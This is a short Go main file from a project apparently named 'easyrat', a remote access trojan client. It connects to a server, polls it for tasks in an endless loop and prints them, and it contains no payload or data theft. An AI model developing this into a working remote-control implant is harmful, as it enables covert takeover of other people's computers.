package main

import (
	"easyrat/utils"
	"fmt"
	"time"
)

func main() {
	// Connect to the server
	if err := utils.ConnectServer(); err != nil {
		panic("Could not connect to the server! " + err.Error())
	}

	// Main loop
	for {
		time.Sleep(utils.PollingDelay * time.Second)
		tasks, err := utils.GetTasks()
		if err != nil {
			fmt.Println("Error getting tasks!", err)
		}
		fmt.Println(tasks)
	}

	// After program execution disconnect from the server
	utils.DisconnectServer()
}
